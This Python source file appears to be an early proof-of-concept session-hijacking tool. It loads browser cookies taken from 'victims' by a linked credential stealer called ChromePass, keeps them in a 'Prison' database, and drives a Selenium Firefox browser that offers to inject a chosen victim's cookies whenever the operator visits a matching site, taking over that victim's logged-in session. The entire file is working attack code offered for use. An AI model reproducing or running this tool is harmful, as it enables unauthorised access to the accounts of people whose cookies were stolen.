import json
import os
import time
import socket
import selenium
import tldextract
from selenium import webdriver
from _modules.classes import Prison, Victim, CookieJar, Cookie


def load_cookies(victim, driver: webdriver.Firefox):
    for domain in victim:
        for cookie in domain:
            cookie_obj = {
                "name": cookie.name,
                "value": cookie.value,
                "domain": cookie.domain
            }
            driver.add_cookie(cookie_obj)
    print("[+] Cookies loaded successfully")


def get_cookies(prison, directory="data"):
    if not os.path.exists(directory):
        print(
            "[-] No data detected. Please use ChromePass and place the Data folder here.")
        print("[i] ChromePass link: https://github.com/darkarp/chromepass")
        return False
    _, victims, _ = next(os.walk(directory))
    for victim in victims:
        with open(f"{directory}/{victim}/cookies0.json") as f:
            cookies = json.load(f)

        cookie_list = []
        for (domain, cookiejar) in cookies.items():
            for cookie in cookiejar:
                cookie_list.append(Cookie(
                    cookie["name"], cookie["value"], cookie["domain"]))
        cookie_jar = CookieJar(cookie_list)
        victim_obj = Victim(victim)
        victim_obj.update_cookies(cookie_jar)
        prison.add_victim(victim_obj)
    prison._save_db()
    print("[+] Database updated successfully...")
    return True


def is_ip(selection):
    try:
        socket.gethostbyname(selection)
        return True
    except socket.gaierror:
        return False


def is_int(number):
    try:
        int(number)
        return True
    except ValueError:
        return False


def victim_verify(victims, selection):
    if selection == "s":
        return True
    elif is_int(selection):
        if selection in victims:
            return victims[selection]
    elif is_ip(selection):
        for _, ip in victims.items():
            if ip == selection:
                return ip

    return False


def show_selection(victims):
    print("\nVictim list:")
    for (index, ip) in victims.items():
        print(f"{index}: {ip}")
    print("\n")
    selection = input("Who do you want to load? (number or ip, s to skip): ")
    if selection == "s":
        return False
    return selection


def selection_screen(victims, url):
    os.system("cls")
    if victims:
        victim_ips = {str(index): ip for (index, ip) in enumerate(victims)}
        print(
            f"[+] Found {len(victims)} victim(s) with cookies for the website: {url}")
        selection = show_selection(victim_ips)
        victim = victim_verify(victim_ips, selection)
        while not victim and selection:
            print("Couldn't find a record... Try again.")
            selection = show_selection(victim_ips)
            victim = victim_verify(victim_ips, selection)

        if selection:
            print(f"[+] Selection verified for: {victim}")
            print(f"[+] Loading Cookies")
            return victim
        else:
            print("[+] Skipping...")
    else:
        print(f"[-] Found 0 victims for the website: {url}")
    return False


def run_browser_interactive(database):

    print(f"[+] Loading Browser...")
    driver = webdriver.Firefox()
    driver.get("https://www.google.com")
    added = set()
    while True:
        url = driver.current_url
        domains = []
        subdomain, domain, suffix = tldextract.extract(url)
        full_url = f"{subdomain}.{domain}.{suffix}"
        if full_url not in added:
            added.add(full_url)
            domains.append(full_url)
            if subdomain:
                domains.append(f".{domain}.{suffix}")
            victims = database.from_domains(domains)
            victim = selection_screen(victims, url)
            if victim:
                load_cookies(victims[victim], driver)
                driver.get(url)
        time.sleep(3)


def run_browser_url(database, url):
    print("[-] To be implemented")


if __name__ == "__main__":
    print("[!] Warning: This is still a very early stage proof of concept...")
    database = Prison()
    if get_cookies(database):
        run_browser_interactive(database)